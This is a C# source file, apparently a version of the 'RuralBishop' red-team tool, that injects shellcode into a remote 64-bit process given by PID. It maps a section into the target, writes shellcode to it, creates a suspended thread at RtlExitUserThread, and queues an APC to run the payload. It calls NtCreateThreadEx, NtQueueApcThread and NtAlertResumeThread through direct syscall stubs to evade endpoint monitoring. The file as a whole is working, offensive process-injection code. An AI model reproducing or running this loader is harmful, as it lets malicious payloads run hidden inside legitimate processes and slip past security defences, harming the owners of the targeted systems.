using System;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace RuralBishop
{
    class Program
    {
        public static void KnightKingside( QueensGambit.PROC_VALIDATION Pv)
        {
            // Read in sc bytes
            QueensGambit.SC_DATA scd = QueensGambit.ReadShellcode();
            if (scd.iSize == 0)
            {
                Console.WriteLine("[!] Unable to read shellcode bytes..");
                return;
            }

            // Create local section & map view of that section as RW in our process
            Console.WriteLine("\n[>] Creating local section..");
            QueensGambit.SECT_DATA LocalSect = QueensGambit.MapLocalSection(scd.iSize);
            if (!LocalSect.isvalid)
            {
                return;
            }

            // Map section into remote process
            Console.WriteLine("[>] Map RX section to remote proc..");
            QueensGambit.SECT_DATA RemoteSect = QueensGambit.MapRemoteSection(Pv.hProc, LocalSect.hSection, scd.iSize);
            if (!RemoteSect.isvalid)
            {
                return;
            }

            // Write sc to local section
            Console.WriteLine("[>] Write shellcode to local section..");
            Console.WriteLine("    |-> Size: " + scd.iSize);
            Marshal.Copy(scd.bScData, 0, LocalSect.pBase, (int)scd.iSize);

            // Find remote thread start address offset from base -> RtlExitUserThread
            Console.WriteLine("[>] Seek export offset..");
            Console.WriteLine("    |-> pRemoteNtDllBase: 0x" + String.Format("{0:X}", (Pv.pNtllBase).ToInt64()));
            IntPtr pFucOffset = QueensGambit.GetLocalExportOffset("ntdll.dll", "RtlExitUserThread");
            if (pFucOffset == IntPtr.Zero)
            {
                return;
            }

            // Create suspended thread at RtlExitUserThread in remote proc
            Console.WriteLine("[>] NtCreateThreadEx -> RtlExitUserThread <- Suspended..");
            IntPtr hRemoteThread = IntPtr.Zero;
            IntPtr pRemoteStartAddress = (IntPtr)((Int64)Pv.pNtllBase + (Int64)pFucOffset);

            IntPtr pSysCall = SharpSploit.Execution.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            QueensGambit.NtCreateThreadEx fSyscallNtCreateThreadEx = (QueensGambit.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(QueensGambit.NtCreateThreadEx));
            UInt32 CallResult = fSyscallNtCreateThreadEx(ref hRemoteThread, 0x1FFFFF, IntPtr.Zero, Pv.hProc, pRemoteStartAddress, IntPtr.Zero, true, 0, 0xffff, 0xffff, IntPtr.Zero);

            if (hRemoteThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to create remote thread..");
                return;
            }
            else
            {
                Console.WriteLine("    |-> Success");
            }

            // Queue APC
            Console.WriteLine("[>] Set APC trigger & resume thread..");

            pSysCall = SharpSploit.Execution.DynamicInvoke.Generic.GetSyscallStub("NtQueueApcThread");
            QueensGambit.NtQueueApcThread fSyscallNtQueueApcThread = (QueensGambit.NtQueueApcThread)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(QueensGambit.NtQueueApcThread));
            CallResult = fSyscallNtQueueApcThread(hRemoteThread, RemoteSect.pBase, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            if (CallResult == 0)
            {
                Console.WriteLine("    |-> NtQueueApcThread");
            }
            else
            {
                Console.WriteLine("[!] Unable register APC..");
                return;
            }

            // Resume thread
            UInt32 SuspendCount = 0;

            pSysCall = SharpSploit.Execution.DynamicInvoke.Generic.GetSyscallStub("NtAlertResumeThread");
            QueensGambit.NtAlertResumeThread fSyscallNtAlertResumeThread = (QueensGambit.NtAlertResumeThread)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(QueensGambit.NtAlertResumeThread));
            CallResult = fSyscallNtAlertResumeThread(hRemoteThread, ref SuspendCount);

            if (CallResult == 0)
            {
                Console.WriteLine("    |-> NtAlertResumeThread");
            }
            else
            {
                Console.WriteLine("[!] Failed to resume thread..");
            }
        }

        static void Main(string[] args)
        {
            //QueensGambit.PrintBanner();
            //if (args.Length == 0)
            //{
            //    QueensGambit.GetHelp();
            //}
            //else
            
                //int iPathScBin = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(p|Path)$").Match(s).Success);
                int iPID = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);
               

                if (iPID != -1)
                {
                    

                    try
                    {
                        //String sPathScBin = args[(iPathScBin + 1)];
                        Int32 Proc = int.Parse(args[(iPID + 1)]);
                    //Boolean bFilePath = QueensGambit.PathIsFile(sPathScBin);
                    int bClean = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(c|Clean)$").Match(s).Success);
                    QueensGambit.PROC_VALIDATION pv = QueensGambit.ValidateProc(Proc);

                        if ( !pv.isvalid || pv.hProc == IntPtr.Zero)
                        {
                            if (!pv.isvalid)
                            {
                                Console.WriteLine("[!] Invalid PID specified (-i|--Inject)..");
                            }
                            else
                            {
                                Console.WriteLine("[!] Unable to aquire process handle (-i|--Inject)..");
                            }

                            return;
                        }
                        else
                        {
                            Console.WriteLine("|--------");
                            Console.WriteLine("| Process    : " + pv.sName);
                            Console.WriteLine("| Handle     : " + pv.hProc);
                            Console.WriteLine("| Is x32     : " + pv.isWow64);
                            //Console.WriteLine("| Sc binpath : " + sPathScBin);
                            Console.WriteLine("|--------");

                            if (pv.isWow64)
                            {
                                Console.WriteLine("\n[!] Injection is only supported for 64-bit processes..");
                                return;
                            }

                            KnightKingside( pv );
                        }
                    }
                    catch
                    {
                        QueensGambit.GetHelp();
                    }
                }
                else
                {
                    QueensGambit.GetHelp();
                }
            
        }
    }
}